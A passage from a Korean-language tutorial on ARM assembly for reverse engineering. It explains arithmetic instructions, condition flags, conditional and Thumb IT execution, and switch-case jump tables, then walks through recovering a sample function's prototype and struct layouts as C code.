<p>기초적인 산술 및 논리 연산 인스트럭션으로는 <code>ADD</code> , <code>SUB</code> , <code>MUL</code> , <code>AND</code> , <code>ORR</code> , <code>EOR</code> 이 있습니다. 다음 예제에서 일부 인스트럭션에는 <code>S</code> 접미사가 붙어 있는데, 산술 연산의 결과에 따라 <code>CPSR</code> 레지스터의 플래그(e.g. zero 비트, negative 비트)를 갱신해야 함을 의미합니다.</p>
<ul>
<li>x86/64와는 달리, ARM 산술 인스트럭션은 기본적으로 <code>CPSR</code> 을 갱신하지 않습니다.</li>
</ul>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADD</span> <span class="built_in">R3</span>, <span class="built_in">R9</span>              <span class="comment">; R3 = R3 + R9</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#8</span>         <span class="comment">; R11 = SP + 8</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">R0</span>, <span class="built_in">R4</span>, <span class="keyword">LSL</span> <span class="number">#2</span>      <span class="comment">; R0 = (R4 &lt;&lt; 2)</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">SP</span>, <span class="built_in">SP</span>, <span class="number">#0x1a8</span>      <span class="comment">; SP = SP - 0x1a8</span></span><br><span class="line"><span class="keyword">MUL</span> <span class="built_in">R2</span>, <span class="built_in">R3</span>, <span class="built_in">R5</span>          <span class="comment">; R2 = R3 * R5 (결과의 하위 32비트만 저장됩니다)</span></span><br><span class="line"><span class="keyword">ANDS</span> <span class="built_in">R2</span>, <span class="built_in">R4</span>, <span class="number">#7</span>         <span class="comment">; R2 = R4 &amp; 7 (CPSR을 갱신합니다)</span></span><br><span class="line"><span class="keyword">EOR</span> <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="keyword">LSL</span> <span class="number">#3</span>  <span class="comment">; R3 = R3 ^ (R1 &lt;&lt; 3)</span></span><br><span class="line"><span class="keyword">EORS</span> <span class="built_in">R3</span>, <span class="built_in">R2</span>             <span class="comment">; R3 = R3 ^ R2 (CPSR을 갱신합니다)</span></span><br><span class="line"><span class="keyword">ORR</span> <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="built_in">R2</span>, <span class="keyword">LSL</span> <span class="number">#8</span>  <span class="comment">; R3 = R3 | (R2 &lt;&lt; 8)</span></span><br><span class="line"><span class="keyword">ORRS</span> <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="number">#2</span>         <span class="comment">; R3 = R3 | 2 (CPSR을 갱신합니다)</span></span><br><span class="line"><span class="keyword">ORRS</span> <span class="built_in">R3</span>, <span class="built_in">R2</span>             <span class="comment">; R3 = R3 | R2 (CPSR을 갱신합니다)</span></span><br></pre></td></tr></table></figure>
<p><code>MUL</code> 인스트럭션은 결과의 하위 32비트만이 목적지 레지스터에 저장되며, 64비트 값 전체가 필요한 경우 <code>SMULL</code> , <code>UMALL</code> 인스트럭션을 사용해야 합니다. 또한 나눗셈 인스트럭션이 존재하지 않는데, (ARMv7-R과 ARMv7-M에 <code>SDIV</code> , <code>UDIV</code> 인스트럭션이 있기는 합니다) 실제로는 나눗셈을 소프트웨어적으로 구현하여 필요한 경우 호출하도록 합니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">R1</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R6</span></span><br><span class="line"><span class="keyword">BL</span> __rt_udiv            <span class="comment">; 소프트웨어적으로 구현한 나눗셈 함수</span></span><br></pre></td></tr></table></figure>
<h2 id="%EC%A1%B0%EA%B1%B4%EB%B6%80-%EB%B6%84%EA%B8%B0%EC%99%80-%EC%8B%A4%ED%96%89" tabindex="-1">조건부 분기와 실행</h2>
<p>반복문과 조건문애서 사용되는 조건부 분기는 <code>CPSR</code> 레지스터에서 다음과 같은 플래그들을 사용합니다.</p>
<ul>
<li><code>N</code> (negative flag) - 결과가 음수인 경우 (최상위 비트가 1인 경우) 1입니다.</li>
<li><code>Z</code> (zero flag) - 결과가 0이면 1입니다.</li>
<li><code>C</code> (carry flag) - 부호가 없는 연산의 결과 오버플로우가 발생하면 1입니다.</li>
<li><code>V</code> (overflow flag) - 부호가 있는 연산의 결과 오버플로우가 발생하면 1입니다.</li>
<li><code>IT</code> (if-then bits) - Thumb 상태의 <code>IT</code> 인스트럭션에서 조건부 분기의 조건들에 해당하는데, 뒤에서 자세히 설명합니다.</li>
</ul>
<p>인스트럭션은 다음과 같이 조건을 나타내는 접미사 중 하나를 붙여 조건부로 실행할 수 있습니다.</p>
<ul>
<li>e.g. <code>BLT</code> 는 아래 표에서 <code>LT</code> 조건이 참인 경우에만 분기하라는 의미로, x86/64에서의 <code>JL</code> 과 같습니다.</li>
</ul>
<table>
<thead>
<tr>
<th>접미사</th>
<th>의미</th>
<th>플래그</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>EQ</code></td>
<td>Equal</td>
<td><code>Z == 1</code></td>
</tr>
<tr>
<td><code>NE</code></td>
<td>Not equal</td>
<td><code>Z == 0</code></td>
</tr>
<tr>
<td><code>MI</code></td>
<td>Minus, negative</td>
<td><code>N == 1</code></td>
</tr>
<tr>
<td><code>PL</code></td>
<td>Plus, positive or zero</td>
<td><code>N == 0</code></td>
</tr>
<tr>
<td><code>HI</code></td>
<td>Unsigned higher/above</td>
<td><code>C == 1</code> and <code>Z == 0</code></td>
</tr>
<tr>
<td><code>LS</code></td>
<td>Unsigned lower/below</td>
<td><code>C == 0</code> or <code>Z == 1</code></td>
</tr>
<tr>
<td><code>GE</code></td>
<td>Signed greater than or equal</td>
<td><code>N == V</code></td>
</tr>
<tr>
<td><code>LT</code></td>
<td>Signed less than</td>
<td><code>N != V</code></td>
</tr>
<tr>
<td><code>GT</code></td>
<td>Signed greater than</td>
<td><code>Z == 0</code> and <code>N == V</code></td>
</tr>
<tr>
<td><code>LE</code></td>
<td>Signed less than or equal</td>
<td><code>Z == 1</code> or <code>N != V</code></td>
</tr>
</tbody>
</table>
<p>비교를 위한 인스트럭션으로 <code>CBZ</code> , <code>CMP</code> , <code>TST</code> , <code>CMN</code> , <code>TEQ</code> 가 있으며, 비교 인스트럭션은 기본값으로 <code>CPSR</code> 을 갱신하지 않는 다른 인스트럭션과 달리 <code>CPSR</code> 의 플래그들을 자동으로 갱신합니다.</p>
<p>가장 흔한 비교 인스트럭션은 <code>CMP</code> 로, <code>Rn</code> 은 레지스터이고 <code>Operand2</code> 는 상수, 레지스터의 값 또는 레지스터의 값에 배럴 시프터를 사용한 값입니다. <code>CMP</code> 는 x86/64에서와 같이 <code>Rn - Operand2</code> 를 연산하고, <code>CPSR</code> 을 갱신한 후 결과를 버립니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMP</span> Rn, Operand2</span><br></pre></td></tr></table></figure>
<p>다음 여러 블록이 있는 조건문에서 조건 분기가 사용되는 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">CMP.W</span> <span class="built_in">R3</span>, <span class="built_in">R7</span>, <span class="keyword">ASR</span> <span class="number">#31</span></span><br><span class="line"><span class="keyword">BLT</span> loc_less</span><br><span class="line"><span class="keyword">BGT</span> loc_greater</span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">R5</span>, <span class="built_in">R7</span></span><br><span class="line"><span class="keyword">BLS</span> loc_less</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_greater:</span></span><br><span class="line"><span class="keyword">SUBS</span> <span class="built_in">R5</span>, <span class="number">#7</span></span><br><span class="line"><span class="symbol">SBC.W</span> <span class="built_in">LR</span>, <span class="built_in">LR</span>, <span class="number">#0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_less:</span></span><br><span class="line"><span class="symbol">UMULL.W</span> <span class="built_in">R1</span>, <span class="built_in">R2</span>, <span class="built_in">R5</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="symbol">SMULL.W</span> <span class="built_in">R0</span>, <span class="built_in">R4</span>, <span class="built_in">R7</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="symbol">MLA.W</span> <span class="built_in">R3</span>, <span class="built_in">LR</span>, <span class="built_in">R8</span>, <span class="built_in">R2</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (R3 &lt; R7) &#123; <span class="keyword">goto</span> loc_less; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (R3 &gt; R7) &#123; <span class="keyword">goto</span> loc_greater; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (R5 &lt; R7) &#123; <span class="keyword">goto</span> loc_less; &#125;</span><br></pre></td></tr></table></figure>
<p>다음으로 흔한 비교 인스트럭션은 <code>TST</code> 로, <code>CMP</code> 와 문법이 같습니다. 마찬가지로 x86/64의 <code>TEST</code> 와 같이 <code>Rn &amp; Operand2</code> 를 연산하고, <code>CPSR</code> 을 갱신한 후 결과를 버립니다. <code>TST</code> 는 주로 어떤 값이 다른 값과 동일한지, 또는 특정 플래그를 검사하기 위해 사용합니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">TST</span> Rn, Operand2</span><br></pre></td></tr></table></figure>
<p>다음은 특정 비트를 검사하여 참인 경우 분기하는 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDRH</span> <span class="built_in">R3</span>, [<span class="built_in">R5</span>,<span class="number">#0x14</span>]</span><br><span class="line"><span class="symbol">TST.W</span> <span class="built_in">R3</span>, <span class="number">#2</span></span><br><span class="line"><span class="keyword">BEQ</span> loc_10179DA</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_10179BE:</span></span><br><span class="line"><span class="keyword">LDRH</span> <span class="built_in">R2</span>, [<span class="built_in">R5</span>,<span class="number">#0x14</span>]</span><br><span class="line"><span class="symbol">TST.W</span> <span class="built_in">R2</span>, <span class="number">#4</span></span><br><span class="line"><span class="keyword">BEQ</span> loc_10179E8</span><br></pre></td></tr></table></figure>
<p><code>CBZ</code> 와 <code>CBNZ</code> 는 Thumb 상태에서 자주 쓰이는 비교 인스트럭션입니다. <code>CBZ</code> 는 레지스터 <code>Rn</code> 의 값이 0이면 <code>label</code> 로 분기하고, <code>CBNZ</code> 는 0이 아니면 분기합니다. 이들 인스트럭션은 주로 정수형 변수의 값이 0인지, 또는 포인터가 <code>NULL</code> 인지 검사하기 위해 사용합니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CBZ</span> Rn, label</span><br><span class="line"><span class="keyword">CBNZ</span> Rn, label</span><br></pre></td></tr></table></figure>
<p>다음은 함수가 반환한 포인터가 <code>NULL</code> 인지 검사하는 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BL</span> foo              <span class="comment">; 함수 foo는 포인터를 반환합니다.</span></span><br><span class="line"><span class="keyword">CBZ</span> <span class="built_in">R0</span>, loc_100BC8E</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_100BCE:</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R0</span>, <span class="number">#1</span></span><br><span class="line"><span class="keyword">B</span> locret_100BCE4</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">locret_100BCE4:</span></span><br><span class="line"><span class="symbol">POP.W</span> &#123;<span class="built_in">R3</span>-<span class="built_in">R8</span>,<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a = foo(...);</span><br><span class="line"><span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br></pre></td></tr></table></figure>
<p>분기 인스트럭션 <code>B</code> 에 조건 접미사를 붙이면 (e.g. <code>BEQ</code> , <code>BLE</code> , <code>BLT</code> , <code>BLS</code>) 조건 분기를 수행합니다. 대부분의 ARM 인스트럭션에는 조건 접미사를 붙여 조건부 실행이 가능하며, 조건이 참이 아닌 경우 그 인스트럭션은 <code>NOP</code> 와 같이 취급합니다. 이러한 조건부 실행은 분기에 필요한 인스트럭션의 수를 줄이는 데 도움이 됩니다.</p>
<p>다음은 포인터가 <code>NULL</code> 이 아닌 경우 구조체의 특정 필드를 반환하는 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="keyword">MOVEQ</span> <span class="built_in">R0</span>, <span class="number">#1</span></span><br><span class="line"><span class="symbol">LDRNEB</span> <span class="built_in">R0</span>, [<span class="built_in">R0</span>,<span class="number">#0x48</span>]</span><br><span class="line"><span class="keyword">BX</span> <span class="built_in">LR</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">return</span> a-&gt;off_48; &#125;</span><br></pre></td></tr></table></figure>
<h3 id="thumb-%EC%83%81%ED%83%9C%EC%97%90%EC%84%9C%EC%9D%98-%EC%A1%B0%EA%B1%B4%EB%B6%80-%EC%8B%A4%ED%96%89" tabindex="-1">Thumb 상태에서의 조건부 실행</h3>
<p>Thumb 상태에서는 <code>IT</code> (if-then) 인스트럭션을 사용해야만 조건부 실행이 가능합니다. (<code>B</code> 는 예외입니다)</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">ITxyz</span> cc</span><br></pre></td></tr></table></figure>
<p><code>IT</code> 인스트럭션은 뒤따르는 최대 4개의 인스트럭션까지 조건부로 실행될 수 있도록 합니다. <code>cc</code> 는 첫째 인스트럭션의 실행 조건이며, <code>x</code> , <code>y</code> , <code>z</code> 는 각각 둘째, 셋째, 넷째 인스트럭션의 조건을 나타냅니다. 이 3개의 조건은 <code>T</code> 또는 <code>E</code> 로만 나타낼 수 있습니다.</p>
<ul>
<li><code>T</code> - <code>cc</code> 가 참이면 실행합니다.</li>
<li><code>E</code> - <code>cc</code> 가 거짓이면 실행합니다.</li>
</ul>
<p>다음은 if-else 블록을 <code>IT</code> 인스트럭션으로 작성한 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R3</span>, <span class="number">#0</span>          <span class="comment">; 비교 인스트럭션으로, CPSR을 갱신합니다.</span></span><br><span class="line"><span class="keyword">ITEE</span> NE             <span class="comment">; IT 블록을 시작합니다.</span></span><br><span class="line"><span class="symbol">CLZNE.W</span> <span class="built_in">R0</span>, <span class="built_in">R12</span>     <span class="comment">; 첫째 인스트럭션은 비교의 결과 NE 조건이 참이면 실행됩니다.</span></span><br><span class="line"><span class="symbol">CLZEQ.W</span> <span class="built_in">R0</span>, <span class="built_in">R6</span>      <span class="comment">; 둘째 인스트럭션은 NE 조건이 거짓이면 실행됩니다.</span></span><br><span class="line"><span class="keyword">ADDEQ</span> <span class="built_in">R0</span>, <span class="number">#0x20</span>     <span class="comment">; 셋째 인스트럭션은 NE 조건이 거짓이면 실행됩니다.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (R3 != <span class="number">0</span>) &#123;</span><br><span class="line">    R0 = countleadzeros(R12);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    R0 = countleadzeros(R6);</span><br><span class="line">    R0 += <span class="number">0x20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="switch-case-%EA%B5%AC%EB%AC%B8" tabindex="-1">Switch-case 구문</h3>
<p>Switch-case 구문은 여러 묶음의 if-else 블록과 같습니다. 컴파일 시점에 각 case 블록의 위치를 알 수 있으므로, 컴파일러는 점프 테이블을 생성하여 switch-case 구문을 처리합니다. ARM 상태에서는 점프 테이블에 각 case 블록의 주소를, Thumb 상태에서는 블록의 오프셋을 저장합니다. 런타임에서는 점프 테이블을 읽고 목적지 주소를 <code>PC</code> 로 불러들이는 간접 분기(indirect branch)를 수행합니다.</p>
<p>다음은 ARM 상태에서 switch-case 구문의 예제입니다. ARM 상태에서 간접 분기는 <code>PC</code> 를 목적지 레지스터로 하는 <code>LDR</code> 인스트럭션을 사용합니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R1</span>, <span class="number">#0xb</span>                <span class="comment">; R1이 case인데, 점프 테이블의 범위 안에 있는지 확인합니다.</span></span><br><span class="line"><span class="keyword">LDRLS</span> <span class="built_in">PC</span> [<span class="built_in">PC</span>,<span class="built_in">R1</span>,LSL<span class="number">#2</span>]      <span class="comment">; 범위 안에 있으면 점프 테이블을 읽고 PC에 대입하여 분기합니다.</span></span><br><span class="line"><span class="keyword">B</span> loc_DD10                  <span class="comment">; 범위 안에 없으면 break합니다.</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DD3C                <span class="comment">; 점프 테이블입니다.</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DD4C</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DCEC                <span class="comment">; 인덱스 8 (case 8에 해당)</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DCEC                <span class="comment">; 인덱스 9 (case 9에 해당)</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DD3C</span><br><span class="line"><span class="symbol">DCD</span> loc_DD3C</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_DCEC:</span>                   <span class="comment">; case 8, 9에 해당하는 코드 블록입니다.</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">R1</span>, <span class="built_in">R1</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R3</span>, <span class="number">#4</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R0</span>, [<span class="built_in">R2</span>,<span class="number">#0x14</span>]</span><br><span class="line"><span class="keyword">STRH</span> <span class="built_in">R3</span>, [<span class="built_in">R2</span>,<span class="number">#0x1c</span>]</span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R1</span>, [<span class="built_in">R2</span>,<span class="number">#0x10</span>]</span><br></pre></td></tr></table></figure>
<p>Thumb 상태에서는 점프 테이블에 case 블록의 주소가 아닌 오프셋을 보관합니다. 간접 분기는 특수한 인스트럭션 <code>TBB</code> 와 <code>TBH</code> 를 사용하는데, 점프 테이블의 값에 2를 곱하고 <code>PC</code> 에 더하여 case 블록의 주소를 얻습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R1</span>, <span class="number">#0xb</span>                <span class="comment">; R1이 case인데, 점프 테이블의 범위 안에 있는지 확인합니다.</span></span><br><span class="line"><span class="keyword">BHI</span> loc_101E6F2             <span class="comment">; 범위 안에 없으면 break합니다.</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R6</span>, <span class="number">#4</span></span><br><span class="line"><span class="symbol">TBB.W</span> [<span class="built_in">PC</span>,<span class="built_in">R1</span>]               <span class="comment">; 점프 테이블을 읽고 분기합니다.</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">6</span>                       <span class="comment">; 점프 테이블입니다.</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">0xf</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">0x6d</span>                    <span class="comment">; 인덱스 8 (case 8에 해당)</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">0x6d</span>                    <span class="comment">; 인덱스 9 (case 9에 해당)</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">6</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">6</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_101E6E4:</span>                <span class="comment">; case 8, 9에 해당하는 코드 블록입니다.</span></span><br><span class="line"><span class="symbol">SUBS.W</span> <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R0</span>, [<span class="built_in">R4</span>,<span class="number">#0x14</span>]</span><br></pre></td></tr></table></figure>
<h2 id="%EB%A6%AC%EB%B2%84%EC%8A%A4-%EC%97%94%EC%A7%80%EB%8B%88%EC%96%B4%EB%A7%81-%EC%97%B0%EC%8A%B5" tabindex="-1">리버스 엔지니어링 연습</h2>
<p>지금까지 살펴본 내용을 바탕으로, 예제 함수를 직접 리버스 엔지니어링해보면서 연습해 보겠습니다. 함수를 호출하는 코드는 다음과 같으며, 함수의 코드는 그래프로 나타내었습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, [<span class="built_in">SP</span>,<span class="number">#0x5c</span>]</span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R2</span>, [<span class="built_in">SP</span>,<span class="number">#0x58</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R1</span>, <span class="built_in">R10</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R4</span></span><br><span class="line"><span class="keyword">BL</span> unk_function</span><br></pre></td></tr></table></figure>
<p><img src="/images/arm-reverse-engineering-basics/6.png" alt="6.png"></p>
<p>다음은 함수의 코드를 보고 빠르게 확인할 수 있는 사실들입니다.</p>
<ul>
<li>함수는 최대 4개의 인자를 받고, 불리언형을 리턴합니다.
<ul>
<li>함수 호출 코드에서 <code>R0</code> , <code>R1</code> , <code>R2</code> , <code>R3</code> 에 값을 대입하고, 함수의 리턴 직전 <code>R0</code> 에 대입되는 값은 0 아니면 1이기 때문입니다</li>
</ul>
</li>
<li>첫번째, 두번째 인자는 구조체의 포인터라고 추측할 수 있습니다.
<ul>
<li>3행, 4행 등에서 <code>R0</code> 과 <code>R1</code> 이 <code>LDR</code> 인스트럭션의 베이스 주소로 사용되며, 상수 오프셋에 접근하고 있기 때문입니다.</li>
</ul>
</li>
<li>세번째, 네번째 인자의 자료형은 정수입니다.
<ul>
<li>14행, 15행에서 <code>AND</code> , <code>ORR</code> 연산의 인자로 사용되고 있기 때문입니다.</li>
</ul>
</li>
</ul>
<p>이를 바탕으로 함수의 프로토타입을 추측할 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">unk_function</span><span class="params">(struct1 *, struct2 *, <span class="type">int</span>, <span class="type">int</span>)</span></span><br></pre></td></tr></table></figure>
<p>다음으로는 식별된 구조체들의 형태를 살펴보겠습니다.</p>
<ul>
<li>3~6행에서 <code>struct1</code> 의 <code>[R0, #8]</code> 과 <code>struct2</code> 의 <code>[R1, #0x18]</code> 을 비교하고 있습니다.
<ul>
<li>두 필드는 동일한 타입이고, 정수형임을 추측할 수 있습니다.</li>
</ul>
</li>
<li>8행에서 <code>struct1</code> 의 <code>[R0, #0x10]</code> 을 읽고 2와 비교하는데, <code>LDRH</code> (load half word) 인스트럭션을 사용하고 있어 <code>short</code> 타입임을 알 수 있습니다.</li>
<li>11~14행에서 <code>struct1</code> 의 <code>[R0, #0x18]</code> . <code>[R0, #0x1c]</code> 을 읽고 각각 세번째, 네번째 인자와 <code>AND</code> 연산을 하고 있어 필드의 타입이 정수형임을 추측할 수 있습니다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct1</span> &#123;</span></span><br><span class="line">    unk8;          <span class="comment">// +0x8 ; struct2.unk18과 같은 타입</span></span><br><span class="line">    <span class="type">short</span> unk10;    <span class="comment">// +0x10</span></span><br><span class="line">    <span class="type">int</span> unk18;      <span class="comment">// +0x18</span></span><br><span class="line">    <span class="type">int</span> unk1c;      <span class="comment">// +0x1c</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct2</span> &#123;</span></span><br><span class="line">    unk18;          <span class="comment">// +0x18 ; struct1.unk8과 같은 타입</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>16행까지 분석한 내용을 C 코드로 나타내면 다음과 같습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">unk_function</span><span class="params">(struct1 *a1, struct2 *a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (a1.unk8 != s2.unk18</span><br><span class="line">        || a1.unk10 != <span class="number">2</span></span><br><span class="line">        || ((a1.unk18 &amp; a3) | (a1.unk1c &amp; a4)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>이후의 코드를 계속 분석해 보겠습니다.</p>
<ul>
<li>17행은 <code>struct1</code> 의 <code>[R0, #0xc]</code> 를 <code>R3</code> 에 대입하고, 18행은 <code>[R0]</code> 을 <code>R0</code> 에 대입합니다.</li>
<li>19행은 <code>R3 + (R3 &lt;&lt; 1)</code> 을 <code>R2</code> 에 대입하는데, 이는 곧 <code>R3 * 3</code> 입니다.</li>
<li>20행은 <code>struct2</code> 의  <code>[R1, #0xc]</code> 를 <code>R3</code> 에 대입하고, 21행은 다시 <code>[R3, #0xc]</code> 를 <code>R3</code> 에 대입합니다.
<ul>
<li><code>struct2</code> 의 오프셋 <code>0xc</code> 에 위치한 필드는 다른 구조체로의 포인터임을 추측할 수 있습니다.</li>
</ul>
</li>
<li>22행은 <code>R3 + R2 * 8</code> 을 <code>R3</code> 에 대입합니다.</li>
<li>23행은 <code>[R3, #0x16]</code> 의 바이트 값을 <code>LDRSB</code> 인스트럭션을 사용해 <code>R4</code> 에 대입합니다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct1</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> unk0;       <span class="comment">// +0x0</span></span><br><span class="line">    unk8;           <span class="comment">// +0x8 ; struct2.unk18과 같은 타입</span></span><br><span class="line">    <span class="type">int</span> unkc;       <span class="comment">// +0xc</span></span><br><span class="line">    <span class="type">short</span> unk10;    <span class="comment">// +0x10</span></span><br><span class="line">    <span class="type">int</span> unk18;      <span class="comment">// +0x18</span></span><br><span class="line">    <span class="type">int</span> unk1c;      <span class="comment">// +0x1c</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct2</span> &#123;</span></span><br><span class="line">    struct3 *unkc;  <span class="comment">// +0xc</span></span><br><span class="line">    unk18;          <span class="comment">// +0x18 ; struct1.unk8과 같은 타입</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct3</span> &#123;</span></span><br><span class="line">    struct4 *unkc;  <span class="comment">// +0xc;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct4</span> &#123;</span>    <span class="comment">// 크기 24바이트</span></span><br><span class="line">    <span class="type">char</span> unk16;     <span class="comment">// +0x16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>22행, 23행에서 레지스터 값의 정수배를 오프셋으로 사용하고 있어, 배열에 접근하고 있음을 추측할 수 있습니다.</li>
<li>배열의 베이스 주소는 20행의 <code>[R1, #0xc]</code> 이고, 오프셋으로 <code>R3 * 3 * 8</code> 을 연산함에서 크기가 24바이트인 <code>struct4</code> 구조체들의 배열임을 알 수 있습니다.
<ul>
<li>오프셋 계산에 사용된 <code>R3</code> 은 인덱스로, 17행에서 <code>[R0, #0xc]</code> 를 대입한 값입니다.</li>
</ul>
</li>
<li>18행, 24행에서 <code>[R0]</code> 을 인자로 <code>foo</code> 함수를 호출합니다. (<code>foo</code> 의 인자는 1개라고 가정합니다)</li>
</ul>
<p>나머지 코드는 <code>foo</code> 의 리턴값과 23행에서 대입한 <code>R4</code> 에 대한 단순 분기문들로, 분석한 내용을 C 코드에 추가하면 대강의 로직과 구조체 사이의 참조 관계를 파악할 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">unk_function</span><span class="params">(struct1 *a1, struct2 *a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span> &#123;</span><br><span class="line">    <span class="type">char</span> v5;</span><br><span class="line">    <span class="type">int</span> v6;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a1.unk8 != s2.unk18</span><br><span class="line">        || a1.unk10 != <span class="number">2</span></span><br><span class="line">        || ((a1.unk18 &amp; a3) | (a1.unk1c &amp; a4)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    v5 = 